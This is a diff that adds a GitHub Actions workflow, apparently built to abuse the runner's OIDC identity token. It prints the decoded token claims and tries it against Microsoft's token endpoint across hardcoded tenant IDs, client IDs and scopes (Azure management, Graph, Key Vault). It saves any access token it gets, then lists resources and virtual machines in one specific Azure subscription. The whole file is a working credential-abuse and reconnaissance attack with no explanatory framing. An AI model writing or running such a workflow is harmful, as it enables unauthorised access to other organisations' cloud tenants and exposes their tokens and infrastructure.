@@ -1,0 +1,40 @@
+name: ul-oidc-v2
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  e:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: exch
+        run: |
+          set +e
+          O=$(curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          T=$(echo "$O" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
+          echo "len=${#T}"
+          echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 700; echo
+          : > tok.txt
+          for TEN in e8adc959-bf67-48e0-95b4-318b5f73946c c3b32785-891b-4be9-90c2-c6d313ab4895 organizations; do
+           for C in b9590f55-e173-495c-9010-15beb8611a43 25c1dc23-3925-49f1-94d3-4e702da5fa9b 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35; do
+            for R in https://management.azure.com https://graph.microsoft.com https://vault.azure.net; do
+              R2=$(curl -s -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$T" -d client_id=$C --data-urlencode "scope=$R/.default")
+              echo "TRY[$TEN|$C|$R]=$(echo "$R2" | head -c 240)"
+              echo "$R2" | grep -q access_token && { echo "===TOKEN|$TEN|$C|$R==="; echo "$R2" | python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])" >> tok.txt; }
+            done
+           done
+          done
+      - name: arm
+        if: always()
+        run: |
+          set +e
+          [ -s tok.txt ] || { echo NOTOKEN; exit 0; }
+          while read K; do
+            echo "--- ARM with token"
+            curl -s -m 40 -H "Authorization: Bearer $K" 'https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/resources?api-version=2021-04-01' | head -c 2000
+            echo
+            curl -s -m 40 -H "Authorization: Bearer $K" 'https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&statusOnly=true' | head -c 3000
+            echo
+          done < tok.txt
